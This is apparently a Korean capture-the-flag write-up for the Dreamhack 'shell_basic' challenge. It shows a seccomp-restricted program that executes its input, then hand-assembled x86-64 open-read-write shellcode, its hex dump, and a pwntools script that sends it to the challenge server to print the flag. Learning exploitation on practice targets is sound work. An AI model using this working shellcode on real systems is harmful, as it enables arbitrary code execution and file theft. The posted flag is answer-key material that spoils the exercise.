https://honey-push-30b.notion.site/Shell_basic-552a738745dc414c8ff24f9c29360e13 에서 사진 깨짐 없이 볼 수 있다.

# Shell_basic

## 시작전에 알아야 할 점

보통 이거 풀때는 dreamhack shellcode 보고 나서 풀기 때문에 shellcode를 보면서 헷갈렸던 것도 정리해봤다.

.c → .s(어셈블리파일) → .o(object파일) → 실행파일

[https://sens.tistory.com/34](https://sens.tistory.com/34) → int 80을 이용한 시스템 콜 번호들 예를들어 execve를 사용하려면 rax에 11을 넣고 int 80(시스템 콜)을 실행해주면 된다.

![eax에 11을 넣어주고 int 0x80으로 시스템콜을 실행시켜 주어 execve를 실행시키는 예시](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f3503e77-5945-499b-a77c-23e7ca6e63a0/execve.png)

eax에 11을 넣어주고 int 0x80으로 시스템콜을 실행시켜 주어 execve를 실행시키는 예시

위 어셈블리 코드는 execve(”/bin/sh”,null,null)을 어셈블리 코드로 바꿔주는 코드이다.

위 어셈블리 코드에서 이해가 힘들었던 점은 두가지다. 첫번째는 eax를 0으로 만들고 push를 해주는 이유가 무엇일지, 두번째는 /bin/sh를 넣기 위함인데 왜 push하는 문자열은 /bin//sh인가? 

1. eax를 0으로 초기화 해주지않으면 12번째 줄에서 al에 0xb(11)을 넣어주는데 이 앞에 다른 값들이 남아있어 11이 아닌값으로 될 수 있기 때문이다.
2. 리눅스에서는 /bin/sh와 /bin//sh가 결국 실행결과가 같다. 4바이트 크기를 맞춰주기 위해서 /를 넣어준 것.

## 문제 풀이 시작

```c
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

입력한 shellcode를 실행하는 프로그램으로 flag 위치와 이름은 /home/shell_basic/flag_name_is_loooooong 이다. 

입력한 shellcode를 그대로 실행해주기 때문에 저 flag파일을 open 해서 read 한 후 write로 화면에 flag 값을 뿌려주면 정답이 나올 것이다. 그러므로 다음과 같이 진행하면 된다.

1. open, read, write (orw문제)를 어셈블리어로 작성한다. shellcode.asm파일을 만든다.
2. nasm - f elf64 shellcode.asm 으로 컴파일한다.(32비트면 elf64→elf)
3. objcopy —dump-section .text=shellcode.bin shellcode.o 로 쉘코드로 만든다.
4. xxd shellcode.bin 으로 쉘코드를 출력한다.

그러면 이제 어셈블리어로 작성을 해야하는데 무작정 어셈블리어부터 작성하려고 하면 어려우니 먼저 c언어로 작성해보자.

```c
char buf[0x100]; // 플래그의 길이를 모르므로 넉넉하게 버퍼값 설정

int fd = open("/home/shell_basic/flag_name_is_loooooong",RD_ONLY,NULL);
read(fd,buf,0x100);
write(1,buf,0x100);
```

길이를 넉넉하게 설정한 버퍼를 기반으로 open을 이용해 서버측의 플래그가 들어있는 파일을 열고(open), 파일에 들어있는 값을 읽어서(read), 화면에 출력해주면(write) 된다. 이제 이걸 어셈블리어로 하나씩 바꿔보자.

## Open을 어셈블리어로 바꾸기

이에 맞춰서 변환해주려면 먼저 문자열을 16진수로 변환해주어야한다.

```c
/home/shell_basic/flag_name_is_loooooong

----------------------------------------------
2f 68 6f 6d 65 2f 73 68
65 6c 6c 5f 62 61 73 69 
63 2f 66 6c 61 67 5f 6e 
61 6d 65 5f 69 73 5f 6c 
6f 6f 6f 6f 6f 6f 6e 67
```

매우 감사하게도 8바이트씩 잘랐을 때 딱 떨어지도록 글자수를 맞춰주었다.(안그랬으면 /를 추가해서 바이트 길이를 맞춰줘야 했을 것이라 생각했는데 read함수로 읽어서 따로 선언한 buf에 저장하는 것이 아니라 상관없을 것 같다.)

그러면 마지막 줄부터 스택에 push를 하여 넣어주자(리틀 엔디언으로)

```bash
mov rax, 0x676e6f6f6f6f6f6f ;oooooong
push rax
mov rax, 0x6c5f73695f656d61 ;ame_is_l
push rax
mov rax, 0x6e5f67616c662f63 ;c/flag_n
push rax
mov rax, 0x697361625f6c6c65 ;ell_basi
push rax
mov rax,0x68732f656d6f682f ;/home/sh
push rax
mov rdi, rsp ; rdi에 문자열이 저장된 주소 저장
xor rsi, rsi ; O_RDONLY는 0이므로 rsi에 0 저장
xor rdx, rdx ; 파일을 읽을 때 mode는 의미를 갖지 않으므로 rdx도 0 설정
mov rax, 2 ; rax값은 2로 설정
syscall ; rax,rdi,rsi,rdx다 설정하였으므로 open 호출
```

```bash
#define        O_RDONLY        0        /* Open read-only.  */
#define        O_WRONLY        1        /* Open write-only.  */
#define        O_RDWR          2        /* Open read/write.  */
```

#잠깐 여기서 왜 push 0x676e6f6f6f6f6f와 같이 바로 넣지 않나요?

dword data exceed bounds 오류가 뜨기 때문입니다…

![dword data exceed bounds.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8fe0a315-484c-482a-9ab2-68d84ce5eb10/dword_data_exceed_bounds.png)

사실 바로 넣어도 되는줄 알고 해봤는데 rax에 넣어서 8바이트로 명시해주지 않으면 8바이트가 아니라 dword, signed dword로 되는듯 함

## Read를 어셈블리어로 바꾸기

Open의 syscall 결과값(fd)는 rax에 저장되기 때문에 rdi(fd)값에 저장해준다.

rsi는 읽어온 문자열을 저장할 공간이므로 rsp(현재 스택포인터)에서 buf의 크기인 100만큼을 빼준만큼 확보해준다. 

rsi = rsp -0x100

rdx는 읽어 올 문자열의 크기이므로 0x100으로 설정해준다.

즉 다음과 같다.

```bash
mov rdi, rax ; rdi에 open의 결과값인 fd저장
mov rsi, rsp ; rsi에 rsp값 저장
sub rsi, 0x100 ; rsi에 0x100만큼 공간 확보
mov rdx, 0x100 ; rdx는 읽어들일 문자열의 크기 저장
xor rax, rax ; rax값을 0으로 설정
syscall ; Read실행
```

## Write를 어셈블리어로 바꾸기

write(1,buf,0x100);

출력은 stdout으로 할 것이므로 rdi값은 1이며 rsi와 rdx값은 read에서 사용한 값을 그대로 사용한다.

stdin = 0

stdout = 1

stderr = 2

```bash
mov rdi,1; rdi값 설정
mov rax,1; rax값 설정
syscall ; Write 호출
```

## 어셈블리어 종합

```bash
$ cat shell_code.asm
section .text
global _start
_start:
	push 0x00               ;rsp와 opcode간 구분을 위한 0x00 push 0x01(헤더시작)을 push해도 가능한 듯 함 일반적으로는 Null값을 넣는 듯
	push 0x676e6f6f6f6f6f6f ;oooooong
	push 0x6c5f73695f656d61 ;ame_is_l
	push 0x6e5f67616c662f63 ;c/flag_n
	push 0x697361625f6c6c65 ;ell_basi
	push 0x68732f656d6f682f ;/home/sh

	mov rdi, rsp ; rdi에 문자열이 저장된 주소 저장
	xor rsi, rsi ; O_RDONLY는 0이므로 rsi에 0 저장
	xor rdx, rdx ; 파일을 읽을 때 mode는 의미를 갖지 않으므로 rdx도 0 설정
	mov rax, 2 ; rax값은 2로 설정
	syscall ; rax,rdi,rsi,rdx다 설정하였으므로 open 호출

	mov rdi, rax ; rdi에 open의 결과값인 fd저장
	mov rsi, rsp ; rsi에 rsp값 저장
	sub rsi, 0x100 ; rsi에 0x100만큼 공간 확보
	mov rdx, 0x100 ; rdx는 읽어들일 문자열의 크기 저장
	xor rax, rax ; rax값을 0으로 설정
	syscall ; Read실행

	mov rdi,1; rdi값 설정
	mov rax,1; rax값 설정
	syscall ; Write 호출
```

1. open, read, write (orw문제)를 어셈블리어로 작성한다. shellcode.asm파일을 만든다.
2. nasm - f elf64 shellcode.asm 으로 컴파일한다.(32비트면 elf64→elf)
3. objcopy —dump-section .text=shellcode.bin shellcode.o 로 쉘코드로 만든다.
4. xxd shellcode.bin 으로 쉘코드를 출력한다.

단계에서 1번을 완성하였다.

```bash
root@ubuntu://home/user/Desktop# nasm -f elf64 shell_code.asm

--------------------------------2번완료---------------------------

root@ubuntu://home/user/Desktop# objcopy --dump-section .text=shell_code.bin shell_code.o
root@ubuntu://home/user/Desktop# ls
execve      execve.c  execve.S        shell_code.bin  write.asm
execve.bin  execve.o  shell_code.asm  shell_code.o

----------------------------------3번완료-----------------------

root@ubuntu://home/user/Desktop# xxd shell_code.bin
00000000: 6a00 48b8 6f6f 6f6f 6f6f 6e67 5048 b861  j.H.oooooongPH.a
00000010: 6d65 5f69 735f 6c50 48b8 632f 666c 6167  me_is_lPH.c/flag
00000020: 5f6e 5048 b865 6c6c 5f62 6173 6950 48b8  _nPH.ell_basiPH.
00000030: 2f68 6f6d 652f 7368 5048 89e7 4831 f648  /home/shPH..H1.H
00000040: 31d2 b802 0000 000f 0548 89c7 4889 e648  1........H..H..H
00000050: 81ee 0001 0000 ba00 0100 0048 31c0 0f05  ...........H1...
00000060: bf01 0000 00b8 0100 0000 0f05            ............                ..........

----------------------------------4번완료-----------------------
```

따라서 쉘코드는 저 값들에 일일이 \x를 붙여준 값이다. 쉘코드를 찾아냈으니 연결하여 넘겨주면 된다. pwntools를 이용하여 넘겨주었다.

```python
#! /usr/bin/python3
from pwn import *

p=remote("host2.dreamhack.games",23269)
shell=b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x81\xee\x00\x01\x00\x00\xba\x00\x01\x00\x00\x48\x31\xc0\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"

p.recvuntil(b"shellcode: ")
p.send(shell)
p.interactive()
```

#! /usr/bin/python3 는 자꾸 can’t read /var/mail/pwn 에러가 떠서 추가시켜주었다. 

```bash
DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
\x00\x00\xe0\xde\xf4U\x00 o\xed\x9c\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00@n\xed\x9c\xfd\x7f\x00\xe6n\xefd\xb3\x7f\x0\x00\x00\x00\x00n\xed\x9c\xfd\x7f\x00`m\xed\x9c\xfd\x7f\x00\x00\xc2M\x07)6\x00\x00\x00\x00\x00\x00\x00\x00\xd0\x9a\xdf\xf4U\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x00](e\xb3\x7f\x00P\x00\x00\x00\x00\x00\x00U\x00\xd0\x9a\xdf\xf4U\x00\x00\xc2M\x07)6`\x12\xdf\xf4U\x00\x10\xed\x9c\xfd\x7f\x00`    \xe0\xde\xf4U\x00 o\xed\x9c\xfd\x7f\x00\x00\x00\x00\x00$                  [*] Got EOF while reading in interactive
$
```

결과값으로 DH와 그 이후 필요 없는 값 들이 나오는데 이는 넉넉하게 버퍼를 0x100으로 설정해서 DH 문자열이 저장된 공간 그 뒤에 있는 값까지 나오는 것이다.
